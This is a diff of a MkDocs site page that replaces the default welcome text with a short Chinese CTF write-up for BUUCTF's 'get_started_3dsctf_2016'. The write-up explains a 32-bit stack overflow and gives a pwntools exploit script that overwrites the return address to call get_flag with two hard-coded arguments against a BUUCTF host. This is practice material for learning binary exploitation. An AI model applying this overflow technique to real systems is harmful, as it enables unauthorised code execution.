@@ -14,7 +14,7 @@
     
     
       
-        <title>MkDocs - Trick</title>
+        <title>Pwn buuctf get started 3dsctf 2016 - Trick</title>
       
     
     
@@ -60,11 +60,6 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
-        
-        <a href="#welcome-to-mkdocs" class="md-skip">
-          跳转至
-        </a>
-      
     </div>
     <div data-md-component="announce">
       
@@ -91,7 +86,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              MkDocs
+              Pwn buuctf get started 3dsctf 2016
             
           </span>
         </div>
@@ -371,56 +366,11 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        MkDocs
-        <span class="md-nav__icon md-icon"></span>
-      </label>
-    
-    <a href="./" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../aboutMkdocs/" class="md-nav__link">
       MkDocs
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    Commands
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#project-layout" class="md-nav__link">
-    Project layout
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
     
@@ -431,64 +381,39 @@
               </div>
             
             
-              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
-                <div class="md-sidebar__scrollwrap">
-                  <div class="md-sidebar__inner">
-                    
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    Commands
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#project-layout" class="md-nav__link">
-    Project layout
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-                  </div>
-                </div>
-              </div>
-            
           
           <div class="md-content">
             <article class="md-content__inner md-typeset">
               
                 
                 
-                <h1 id="welcome-to-mkdocs">Welcome to MkDocs</h1>
-<p>For full documentation visit <a href="http://mkdocs.org">mkdocs.org</a>.</p>
-<h2 id="commands">Commands</h2>
-<ul>
-<li><code>mkdocs new [dir-name]</code> - Create a new project.</li>
-<li><code>mkdocs serve</code> - Start the live-reloading docs server.</li>
-<li><code>mkdocs build</code> - Build the documentation site.</li>
-<li><code>mkdocs help</code> - Print this help message.</li>
-</ul>
-<h2 id="project-layout">Project layout</h2>
-<pre><code>mkdocs.yml    # The configuration file.
-docs/
-    index.md  # The documentation homepage.
-    ...       # Other markdown pages, images and other files.
+                  <h1>Pwn buuctf get started 3dsctf 2016</h1>
+                
+                <p>先看ida</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201125130206358.png#pic_center" />
+main函数发现可以进行栈溢出</p>
+<p>再看其他函数</p>
+<p>发现get_flag函数需要a1和a2两个参数等于特定值就可以读到flag
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201124233405271.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>可以利用main中的栈溢出进行传参</p>
+<p>32位程序payload = offset + 函数地址 + 返回地址 + 参数</p>
+<p>返回地址我们利用程序中的exit作为返回地址：</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201124234549140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+p = remote('node3.buuoj.cn',29726)
+context.log_level = 'debug'
+sleep(0.1)
+get_flag = 0x080489A0
+exit_addr = 0x0804E6A0 
+payload = 'a'*56
+payload += p32(get_flag) + p32(exit_addr) # 函数地址 返回地址
+payload += p32(0x308CD64F) + p32(0x195719D1) # 参数
+p.sendline(payload)
+sleep(0.1)
+p.recv()
 </code></pre>
+<p><a href="https://www.cnblogs.com/bhxdn/p/12679290.html">参考</a></p>
                 
               
               
@@ -503,27 +428,6 @@ docs/
       
         
 <footer class="md-footer">
-  
-    <div class="md-footer-nav">
-      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
-        
-          <a href="../friend/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-            </div>
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  上一页
-                </span>
-                友情链接
-              </div>
-            </div>
-          </a>
-        
-        
-      </nav>
-    </div>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
